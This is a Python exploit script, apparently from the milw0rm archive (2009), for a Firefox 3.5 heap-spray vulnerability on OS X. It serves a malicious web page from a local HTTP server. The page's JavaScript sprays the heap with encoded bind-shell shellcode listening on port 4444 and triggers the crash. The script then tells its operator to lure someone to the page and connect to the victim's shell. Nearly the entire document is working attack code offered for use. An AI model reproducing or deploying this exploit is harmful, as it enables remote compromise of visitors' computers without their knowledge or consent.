#!/usr/bin/env python
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally Discovered by: Simon Berry-Bryne
# Pythonized by: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""
<html>
<head>
<title>Firefox 3.5 Vulnerability</title>
Firefox 3.5 Heap Spray Exploit for OSX
</br>
Mozilla, We have a problem.
Bind Shell Delivered on Port: 4444
</br>
<div id="content">
<p><FONT>                             </FONT></p>
<p><FONT>Ihazacrashihazacrash</FONT></p>
<p><FONT>Ohnoesihazacrashhazcrash</FONT></p>
<p><FONT>Aaaaahhhhh  </FONT></p>
</div>
<script language=JavaScript>

// osx/x86/vforkshell_bind_tcp - 152 bytes
// http://www.metasploit.com
// AppendExit=false, PrependSetresuid=false, 
// PrependSetuid=false, LPORT=4444, RHOST=, 
// PrependSetreuid=false
var shellcode = unescape("%uc031%u5099%u5040%u5040%ub052%ucd61%u0f80%u7e82%u0000%u8900%u52c6%u5252%u0068%u1102%u895c%u6ae3%u5310%u5256%u68b0%u80cd%u6772%u5652%ub052%ucd6a%u7280%u525e%u5652%ub052%ucd1e%u7280%u8954%u31c7%u83db%u01eb%u5343%u5357%u5ab0%u80cd%u4372%ufb83%u7503%u31f1%u50c0%u5050%ub050%ucd3b%u9080%u3c90%u752d%ub009%ucd42%u8380%u00fa%u1774%uc031%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5350%ub050%ucd3b%u3180%u50c0%ue389%u5050%u5053%ub050%ucd07%u3180%u50c0%u4050%u80cd");
var oneblock = unescape("%u4141%u4141");
var fullblock = oneblock;
while (fullblock.length<0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i<600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i<data.length;i++)
  {
   c=data.charAt(i);
   if(c=='&' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["str"] = "blah";
    var newElement = document.getElementById("content")
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName("p")
        if (pTags.length > 0)  
        while (i<pTags.length)
        {
            oTags = pTags[i].getElementsByTagName("font")
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1]["str"] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = "";
    for (i=1;i<searchArray.length;i++)
    {
        html += escapeData(searchArray[i]["str"])
    }    
}
DataTranslator();
GenerateHTML()
</script>
</body>
</html>""")
        print ("\n\n[*] Exploit Sent. [*]\n[*] Wait about 15 seconds and attempt to connect.[*]\n[*] Connect to IP Address: %s and port 4444 [-]" % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally discovered by: Simon Berry-Bryne
# Pythonized: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
""")
print ("Listening on port 80.")
print ("Have someone connect to you.")
print ("\nType <control>-c to exit..")
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print ("\n\n[*] Exiting Exploit.\n\n")
       sys.exit(1)

# milw0rm.com [2009-07-24]
